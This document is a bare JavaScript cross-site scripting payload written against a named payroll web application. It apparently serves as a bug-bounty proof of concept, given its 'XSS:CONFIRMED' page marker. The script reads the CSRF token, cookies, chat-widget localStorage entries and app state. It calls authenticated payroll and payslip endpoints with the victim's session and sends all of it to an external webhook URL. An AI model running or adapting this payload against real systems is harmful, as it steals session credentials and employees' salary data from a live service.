(async () => {
  const WEBHOOK = 'https://webhook.site/12a35676-d3a6-40e5-998b-f053b949ecbf';
  const opener  = window.opener;

  document.title = '[XSS:CONFIRMED] ' + document.domain;
  try { document.body.style.outline = '6px solid red'; } catch(e){}

  const signal = (type, extra) => {
    if (opener) try { opener.postMessage({ type, domain: document.domain, ...extra }, '*'); } catch(e){}
  };

  // window.csrfToken is the CSRF global set by the app on authenticated pages
  const csrfToken = window.csrfToken || null;
  const headers = { 'Content-Type': 'application/json' };
  if (csrfToken) headers['csrf'] = csrfToken;

  signal('ym-xss-fired', { csrfToken });

  // localStorage keys used by Yellow.ai widget and app
  const lsOut = {};
  const lsKeys = [
    'conversation_history__DARTH_VADERS__x1644519963787',
    'anon_jid__DARTH_VADERS__x1644519963787',
    'ajs_user_id', 'ajs_user_traits', 'rzp_utm',
  ];
  for (const k of lsKeys) {
    const v = localStorage.getItem(k);
    if (v) lsOut[k] = v.slice(0, 600);
  }

  // Authenticated API endpoints confirmed live on payroll.razorpay.com
  const endpoints = [
    { method: 'GET',  url: '/v2/api/me' },
    { method: 'GET',  url: '/v2/api/sidebar' },
    { method: 'GET',  url: '/v2/api/workflow/summary' },
    { method: 'GET',  url: '/v2/api/notifications/getNotifications' },
    { method: 'POST', url: '/v2/api/get-run-payroll', body: JSON.stringify({ payroll_month: new Date().toISOString().slice(0,7) + '-01' }) },
    { method: 'GET',  url: '/api/reports/payslips?fromDate=01-01-25&toDate=31-12-26&userId=' + (window._userId || '') },
  ];

  const apiResults = {};
  await Promise.allSettled(endpoints.map(async ({ method, url, body }) => {
    try {
      const opts = { method, credentials: 'include', headers };
      if (body) opts.body = body;
      const r = await fetch(url, opts);
      const text = await r.text();
      apiResults[url] = { status: r.status, body: text.slice(0, 1000) };
      signal('ym-xss-endpoint', { endpoint: url, status: r.status, snippet: text.slice(0, 120) });
    } catch(e) {
      apiResults[url] = { error: e.message };
    }
  }));

  // Try to extract userId from /v2/api/me result for payslip query
  try {
    const meData = JSON.parse(apiResults['/v2/api/me']?.body || '{}');
    if (meData.id) {
      const r = await fetch(`/api/reports/payslips?fromDate=01-01-25&toDate=31-12-26&userId=${meData.id}`, { credentials: 'include', headers });
      const text = await r.text();
      apiResults['/api/reports/payslips'] = { status: r.status, body: text.slice(0, 1000) };
    }
  } catch(e) {}

  // Window globals (React/Redux state)
  const globals = {};
  for (const g of ['__INITIAL_STATE__', '__REDUX_STATE__', '__APP_STATE__', 'store', '__store', 'reduxStore', 'csrfToken']) {
    try { if (window[g] !== undefined) globals[g] = JSON.stringify(window[g]).slice(0, 400); } catch(e){}
  }

  await fetch(WEBHOOK + '?src=rzp-payroll-ym-xss&domain=' + encodeURIComponent(document.domain), {
    method: 'POST',
    mode: 'no-cors',
    body: JSON.stringify({
      domain:       document.domain,
      url:          location.href,
      csrfToken,
      cookies:      document.cookie.slice(0, 800),
      localStorage: lsOut,
      api:          apiResults,
      globals,
    }),
    headers: { 'Content-Type': 'application/json' },
  });
})();
